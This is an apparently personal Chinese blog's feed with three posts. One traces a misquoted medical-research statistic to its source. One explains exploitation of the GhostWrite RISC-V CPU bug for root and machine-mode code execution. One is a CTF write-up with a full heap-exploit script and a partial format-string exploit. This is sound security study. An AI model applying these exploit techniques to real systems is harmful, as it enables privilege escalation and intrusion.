<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2024-12-11T15:52:53+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>amor fati.</subtitle><entry><title type="html">Lies, Damned lies, and Journalism</title><link href="https://www.cameudis.com/2024/12/10/Lies_Damned_Lies_And_Journalism.html" rel="alternate" type="text/html" title="Lies, Damned lies, and Journalism" /><published>2024-12-10T23:00:00+08:00</published><updated>2024-12-10T23:00:00+08:00</updated><id>https://www.cameudis.com/2024/12/10/Lies_Damned_Lies_And_Journalism</id><content type="html" xml:base="https://www.cameudis.com/2024/12/10/Lies_Damned_Lies_And_Journalism.html"><![CDATA[<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102135042.png" alt="学会提问" /></p>

<p>在这个 gossip 满天飞的时代，选择相信什么、选择质疑什么好像变成了每天不得不面对的问题！最近正在读《学会提问（原书 12 版）》，是关于如何判断一个论证是否可信的一本简短的教程。这篇博客分享一下我找到书中一个 bug 的趣事。</p>

<p>在介绍研究成果的证明效力时，作者提到了一项研究：“结果令人信服地表明，原来的断言中有 41% 都是错误的或被极大地夸大的。”（下图的 “WTF!” 左边的内容）</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102142045.png" alt="学会提问截图" /></p>

<p>41% 这个数字实在是太震撼了（WTF!），我立马拍照发给了学医的朋友，配文“医学不存在了”。然后继续读下去：</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102156367.png" alt="学会提问下一页截图" /></p>

<p>发言者和写作者常常歪曲或者简化研究结论，此时我默默在上面标记了“科普者”以及“新闻作者”。</p>

<p>我有一个奇怪的想法，总是觉得“阅读其他领域的论文”是一个很有趣的事。这个想法可能来自 <a href="https://l0tus.vip/cn/5.19/">l0tus</a>，他说：“但很巧也不幸的是，我喜欢看论文。”于是我看完了这章后就尝试在网上寻找 41% 这个研究的原文。</p>

<p>首先，根据书中的“Lies, Damned Lies, and Medical Science” November 2010, Atlantic Magaizne，我们可以找到书中引用的原文——一篇<a href="https://dsp.domains.trincoll.edu/fake-news/fake-news/media/lies%20damned%20lies%20medical%20science.pdf">杂志文章</a>。</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102231949.png" alt="image.png" /></p>

<p>这篇文章并不是数据的出处，而只是介绍了 Dr. John Ioannidis 的研究成果。这个数字作为他开展的一项研究的结论出现在文章中：</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102233822.png" alt="image.png" /></p>

<p>根据期刊名 “Journal of the American Medical Association” 以及作者名 “Dr. John Ioannidis” 继续搜索，我们可以找到原论文《Contradicted and Initially Stronger Effects in Highly Cited Clinical Research》（<a href="https://files.givewell.org/files/methods/Ioannidis%202005-Contradicted%20and%20Initially%20Stronger%20Effects%20in%20Highly%20Cited%20Clinical%20Research.pdf">PDF链接</a>），引用量高达 1830 次。</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202412102237321.png" alt="image.png" /></p>

<p>可惜的是，在这篇文章中，我并没有找到 41% 这个数字。Results 部分中作者说道：在 49 篇高被引原始临床研究中，45 篇声称干预有效。其中，<strong>7 篇( 16% )与后续研究相矛盾，7 篇( 16% )发现了比后续研究更强的效应</strong>，20 篇( 44% )被复制，11 篇( 24% )基本没有受到挑战。</p>

<p>相比杂志的错误说法，我们应该重新将结果归纳为：在 45 个声称干预有效的研究中，有 14 个与后续研究矛盾或可能存在夸大，该比例达到了 <strong>31%</strong>。<strong>这个数据和杂志文章《Lies, Damned Lies, and Medical Science》中的 41% 有着 10% 的巨大差距。</strong></p>

<p>根据我的不负责任猜测，可能是杂志文章作者在计算 $14/45$ 时错误地把 $31\%$ 看成了 $41\%$，从而导致了一连串的错误，最终反映到了和医学完全无关的一本批判性思维科普书籍上。</p>

<p>此外，杂志中所用到的措辞 “had been convincingly shown wrong or significantly exaggerated” 也实在是过于夸张了。一个科研工作者不会动不动就“convincingly”和“significantly”，这种词会对读者产生煽动性，从而影响论证的严谨性。更何况，这篇杂志文章本来就注重于研究医学研究中的夸大现象，更不应该产生这样的不严谨描述。</p>

<p>有趣的是，在原版的论文中 “significant” 一次被使用了 33 次，然而，大多数的使用都位于否定句中，其余的都是对样本研究结论的引用。这就和杂志报道形成了反差。</p>

<p>最终，《学会提问》完成了自指——漂亮地攻击到了自己，于是就有了这篇神奇的博客。</p>

<blockquote>
  <p>There are three kinds of lies: Lies, Damned Lies, and Journalism. ——鲁迅</p>
</blockquote>]]></content><author><name></name></author><category term="思考" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">GhostWrite #1: 漏洞利用思路介绍</title><link href="https://www.cameudis.com/2024/09/16/GhostWrite-1.html" rel="alternate" type="text/html" title="GhostWrite #1: 漏洞利用思路介绍" /><published>2024-09-16T06:04:24+08:00</published><updated>2024-09-16T06:04:24+08:00</updated><id>https://www.cameudis.com/2024/09/16/GhostWrite-1</id><content type="html" xml:base="https://www.cameudis.com/2024/09/16/GhostWrite-1.html"><![CDATA[<p>如果你突然有了任意物理内存地址写的能力，你会做什么？</p>

<!-- more -->

<p>在 2024 暑期，来自 CISPA 的研究人员发现了国产的 CPU 芯片玄铁 C910 等型号的极高危漏洞，允许攻击者通过 RISC-V Vector 拓展中的错误实现指令实现<strong>任意地址物理内存写入</strong>。这是工作的官网：<a href="https://ghostwriteattack.com/">https://ghostwriteattack.com/</a>。本篇博客将介绍作者团队使用的漏洞利用方法。</p>

<p>物理内存空间不同于受限的虚拟内存空间，电脑上所有的进程、操作系统内核、虚拟化管理器、设备的内存映射……所有大家能想到的东西都在这里。时光倒流回了 1950s，那个没有虚拟内存的时代。</p>

<p>或许你曾经听说过 Core War：在这个 1984 年的游戏中，双方玩家编写的两个程序会在同一片内存空间中进行角斗，通过覆盖对方的代码等方式尝试“杀死”对方的控制流。我们现在遇到的场景就有些类似于这个游戏。</p>

<p>直接进行物理内存的写入几乎可以无视一切内存安全的保护机制。不论是用户态的 NX、KPTI 还是内核态的 SMEP、SMAP，这些基于页表的检查全都无法发挥作用。留给攻击者唯一的困扰就是地址随机化（KASLR）了，这种保护会在每次内核启动时随机一个加载地址，使得攻击者无法使用硬编码的地址完成攻击。</p>

<p>对于我们今天的主角——RISC-V 架构的玄铁处理器来说，情况则有所不同。直到去年的九月份，RISC-V 架构的 KASLR 支持才被合并进入 Linux 主线的 6.6 版本。</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202409152119483.png" alt="Pasted image 20240813155119.png" /></p>

<p>熟悉 Linux 的小伙伴都知道，重视稳定性的发行版常常会绑定某个特定版本的内核，包括 Debian、Ubuntu、CentOS、RHEL 等等。因此，Linux 6.6 以及之后的版本并不会那么快地部署到各个发行版中。（就算新版采用了最新的内核，程序员或许还是喜欢使用老发行版）</p>

<p>比如，目前最新的 Debian 12.6 版本只绑定了 6.1 版本的 Linux 内核；而在 Ubuntu 这边，22.04 LTS 绑定的内核是 5.15 或 5.17 版本，最早使用 6.6 以上内核的是今年发布的 Ubuntu 24.04。总结一下：大部分稳定的发行版都还没有支持 RISC-V 架构的 KASLR！攻击者表示：我从来没有打过如此富裕的仗。</p>

<h2 id="from-write-to-execute">From write to execute</h2>

<p>首先介绍普通用户的 root 提权。</p>

<p>Linux 会根据某个进程的 <code class="language-plaintext highlighter-rouge">UID</code> 来判断其权限，其中 <code class="language-plaintext highlighter-rouge">UID</code> 0 是系统为 root 用户专门保留的 ID。考虑到我们现在能写入内核的任意代码、劫持任意函数，我们可以劫持 <code class="language-plaintext highlighter-rouge">getuid()</code> 这一系统调用，将其函数开头覆盖成我们自己的机器码，使它永远返回 0。</p>

<p><code class="language-plaintext highlighter-rouge">sudo</code>、<code class="language-plaintext highlighter-rouge">su</code> 这样的 Setuid 程序会通过 <code class="language-plaintext highlighter-rouge">getuid()</code> 系统调用来判断用户是否已经是 root，如果是的话（也就是 <code class="language-plaintext highlighter-rouge">UID</code> 为零）就不再要求用户进行认证。因此，在劫持了系统调用之后，攻击者直接进行 ` su ` 就可以切换成 root 用户，完成攻击。</p>

<p>完整的攻击流程如下：</p>

<ol>
  <li>确定内核加载地址以及函数的偏移；</li>
  <li>往 <code class="language-plaintext highlighter-rouge">getuid</code> 的物理内存地址处，写入 <code class="language-plaintext highlighter-rouge">li a0,0; ret</code> 的机器码；</li>
  <li>命令行输入 <code class="language-plaintext highlighter-rouge">su</code>，即可切换为 root 用户。</li>
</ol>

<p>在大部分发行版上，由于 KASLR 不会开启，所以只需要通过本地调试或其他方法拿到 <code class="language-plaintext highlighter-rouge">getuid</code> 的地址就行了。至于小部分使用了 6.6 及以上内核版本的发行版，还需要结合进行物理内存的扫描来获取信息，关于物理内存读取的部分，会在后面进行介绍。</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202409152119426.png" alt="ad02993e5f8b310a48309b1835c64a11.png" /></p>

<p>如果你想要玩点更加花哨的，想在权限级别更高的 Machine Mode 执行代码，也可以使用类似的攻击手法，直接写入修改 Supervisor 代码。作者以 OpenSBI 这套 Supervisor 实现为例，说明了如何进行 Machine Mode 代码执行：</p>

<ol>
  <li>确定 OpenSBI 的版本号以及加载位置；</li>
  <li>修改其中 <code class="language-plaintext highlighter-rouge">SBI_EXT_BASE_GET_MVENDORID</code> 这一 SBI <code class="language-plaintext highlighter-rouge">ecall</code> 的 handler 代码；</li>
  <li>劫持内核调用该 SBI <code class="language-plaintext highlighter-rouge">ecall</code>，即可以 machine mode 执行代码。</li>
</ol>

<p>在基于 C910 的系统上，OpenSBI 的二进制会被加载到固定地址 <code class="language-plaintext highlighter-rouge">0x0</code>，不存在随机化的保护，因此上述攻击的第一步并不是一个很难完成的任务。</p>

<h2 id="from-write-to-read">From write to read</h2>

<p>如果攻击者无法确认内核的内存布局（比如内核系统开启了 KASLR 保护），物理内存任意写原语就显得有些力不从心。</p>

<p>作者受到之前利用 rowhammer 漏洞进行提权的启发（这个 DRAM bug 会导致内存中一些比特发生翻转），使用了类似的攻击方法，能基于写原语得到读原语。</p>

<p>页表作为虚拟地址转换的关键数据结构，可以修改它就可以进行任意读写。虽然攻击者不知道自己进程的页表位于物理内存的哪里，但他可以通过不断往内存里映射同一个文件，来让整个物理内存都被自己进程的页表填满。 这样以来，攻击者随便写入一个物理地址的内存，就大概率会修改到自己的页表。这也是经典的 NOP Sled 思想。</p>

<p>如果攻击者成功修改到了某个自己进程的页表项，他就可以检测到有一个虚拟地址的映射发生了改变（不再映射到原来的文件）。后续，攻击者只需要继续修改这个页表项，就可以修改对应虚拟地址的映射目标，从而读写任意的物理内存地址。</p>

<p>但注意，能够修改页表相当于只是获取了内核同等级的读写权限，但有一些物理内存区域连内核也无法读取（物理内存保护机制），比如 SMM 所在的内存区域。</p>

<p>下图是我基于自己 patch 过的 qemu，在 ubuntu 22.04 上进行攻击的 PoC。可以看到攻击者的用户态程序成功读出了物理地址 0x80400000 的值。</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202409152153850.png" alt="image.png" /></p>

<p>关于 qemu 的 patch 以及攻击代码，可以见下一篇博客。</p>]]></content><author><name></name></author><category term="riscv" /><category term="kernel" /><category term="arch" /><summary type="html"><![CDATA[如果你突然有了任意物理内存地址写的能力，你会做什么？]]></summary></entry><entry><title type="html">CISCN Final 2024</title><link href="https://www.cameudis.com/2024/07/24/CISCN-Final-2024.html" rel="alternate" type="text/html" title="CISCN Final 2024" /><published>2024-07-24T07:50:11+08:00</published><updated>2024-07-24T07:50:11+08:00</updated><id>https://www.cameudis.com/2024/07/24/CISCN-Final-2024</id><content type="html" xml:base="https://www.cameudis.com/2024/07/24/CISCN-Final-2024.html"><![CDATA[<p>国赛决赛PWN赛后复现：</p>

<ul>
  <li>ezheap: 入门堆题，存在 UAF 和任意大小溢出</li>
  <li>anime: 非栈上的格式化字符串漏洞</li>
</ul>

<h2 id="ezheap">ezheap</h2>

<h3 id="程序分析">程序分析</h3>

<p>程序环境为 <code class="language-plaintext highlighter-rouge">2.31</code>，二进制保护全开：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec ./ezheap
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/cameudis/ctf/ciscn2024-final/ezheap/ezheap'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>程序在读入用户输入后，马上就进行了神秘的解析操作。遇到这种情况，我们有以下解决方案：</p>

<ol>
  <li>盲猜是 JSON，或根据解析函数中的一些硬编码的字符发现是 JSON（比如 <code class="language-plaintext highlighter-rouge">'{'</code>）</li>
  <li>求助具有丰富逆向经验的队友，发现使用了 cJSON 库</li>
  <li>使用提前准备的签名进行匹配，如下图所示：</li>
</ol>

<p><img src="https://pic.imgdb.cn/item/669fbbd0d9c307b7e92a4b4d.png" alt="cJSON Signature Match" /></p>

<p>关于 Binary Ninja 如何制作与匹配二进制签名，可以参考 <a href="https://docs.binary.ninja/dev/annotation.html#exporting-a-header">官方文档</a>。</p>

<p>除了神秘的解析之外，本题就是一个入门级菜单堆题。漏洞点有两个：</p>

<ul>
  <li>Delete 函数中存在 dangling pointer（指针未清零）；</li>
  <li>Modify 函数中存在任意大小溢出；</li>
</ul>

<h3 id="利用思路">利用思路</h3>

<p>由于 new 函数中对堆块大小做了 0x400 的限制，且一共只能分配 7 个堆块，因此如果想要泄露 libc 地址，需要通过溢出把堆块 size 改大，来把堆块 free 进 unsorted bin 中。</p>

<p>在此以后，直接 view 还拿不到 libc 地址。由于 cJSON 的实现，在解析用户的指令时，它会申请一系列的堆块。由于刚刚释放进 unsorted bin 的堆块足够大，所以它会被切割数次，导致原来位置上不再是一个指向 unsorted bin 的指针。</p>

<p>但这种情况也很好解决，堆上还有很多遗留的地址，可以先 edit 然后顺带把地址给读出来。（感谢 V3rdant 师傅）</p>

<p>之后就是使用 tcache poisoning 来将 <code class="language-plaintext highlighter-rouge">__free_hook</code> 劫持为 <code class="language-plaintext highlighter-rouge">system</code>，然后执行 <code class="language-plaintext highlighter-rouge">free("/bin/sh")</code> 来拿到 shell 了。</p>

<h3 id="exploit-script">Exploit Script</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>

<span class="c1"># ---------------- Environment Config ---------------- #
</span>
<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>

<span class="c1"># ------------------- Exploitation ------------------- #
</span>
<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="c1"># {"choice":"add","index":0,"length":16,"message":"aaa"}
</span>
<span class="k">def</span> <span class="nf">comm</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">"Please input:"</span><span class="p">)</span>
    <span class="n">s</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="s">"choice"</span><span class="si">:</span><span class="s">"</span><span class="si">{</span><span class="n">choice</span><span class="si">}</span><span class="s">","</span><span class="n">index</span><span class="s">"</span><span class="si">:{</span><span class="n">index</span><span class="si">}</span><span class="p">,</span><span class="s">"length"</span><span class="si">:{</span><span class="n">length</span><span class="si">}</span><span class="p">,</span><span class="s">"message"</span><span class="si">:</span><span class="s">"'.encode()+message+'"</span><span class="si">}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="n">comm</span><span class="p">(</span><span class="s">"new"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">comm</span><span class="p">(</span><span class="s">"rm"</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">comm</span><span class="p">(</span><span class="s">"view"</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="n">comm</span><span class="p">(</span><span class="s">"modify"</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'im_block_0'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'im_block_1'</span><span class="p">)</span>

    <span class="c1"># overflow block_1's size to 0x531 (thus next_chunk is top chunk)
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2a0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x298</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x31\x05</span><span class="s">'</span><span class="p">)</span>

    <span class="c1"># unsorted bin
</span>    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># leak libc address
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xa8</span><span class="p">)</span>
    <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xa8</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x1ecbe0</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

    <span class="c1"># tcache poisoning
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'im_block_2'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s">'im_block_3'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s">'im_block_4'</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x2a8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x2a0</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">])[:</span><span class="mi">6</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">])[:</span><span class="mi">6</span><span class="p">])</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="c1"># ------------------ Infrastructure ------------------ #
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
'''</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for direct without debug"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

    <span class="n">pwn</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="patch">Patch</h3>

<p>由于出题人的检验脚本非常恶心，所以本题修复难度非常大。我和队友尝试了非常多种方法后，最后发现把 <code class="language-plaintext highlighter-rouge">malloc</code> 的参数硬编码为 <code class="language-plaintext highlighter-rouge">0x1000</code> 就可以通过检测。</p>

<h2 id="anime">anime</h2>

<h3 id="程序分析-1">程序分析</h3>

<p>程序环境为 <code class="language-plaintext highlighter-rouge">GLIBC 2.31</code>，二进制保护全开：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec ./pwn
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/cameudis/ctf/ciscn2024-final/anime/pwn'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>在 <code class="language-plaintext highlighter-rouge">main</code> 函数中，程序读取用户输入，并使用硬编码的 key 对输入进行 AES 解密。解密后的消息将会直接被使用 <code class="language-plaintext highlighter-rouge">printf</code> 打印出来，存在格式化字符串漏洞。程序会循环执行上述过程三次，然后从 <code class="language-plaintext highlighter-rouge">main</code> 函数返回。</p>

<p>本题的利用难点在于：存储用户输入的缓冲区位于堆上，且限制了我们只有三次攻击机会。</p>

<h3 id="利用思路-1">利用思路</h3>

<p>关于非栈上的格式化字符串，可以先去找找别的资料看。</p>

<p>3 次机会一定是不足以打穿非栈的格式化字符串溢出的，必须想办法进行更多次攻击。在程序中，我们可以发现表示剩余次数的循环变量 <code class="language-plaintext highlighter-rouge">i</code> 保存在栈上，因此一开始仅有的这三次机会可以用来进行 <code class="language-plaintext highlighter-rouge">i</code> 的劫持。</p>

<ol>
  <li>泄漏栈地址、Libc 基址；</li>
  <li>劫持一个栈上的栈指针，使其指向 <code class="language-plaintext highlighter-rouge">i</code>；</li>
  <li>劫持 <code class="language-plaintext highlighter-rouge">i</code> 为一个更大的数。</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'3 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">'.%6$p.%15$p.</span><span class="se">\0</span><span class="s">'</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>

<span class="p">...</span>
<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)</span>
<span class="n">stack_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">success</span><span class="p">(</span><span class="s">"stack_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_base</span><span class="p">))</span>
<span class="n">i_addr</span> <span class="o">=</span> <span class="n">stack_base</span><span class="o">-</span><span class="mh">0x124</span>
<span class="n">success</span><span class="p">(</span><span class="s">"i: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">i_addr</span><span class="p">))</span>
<span class="p">...</span>

<span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'2 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">i_addr</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%6$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>
<span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'1 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%5c%45$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>

</code></pre></div></div>

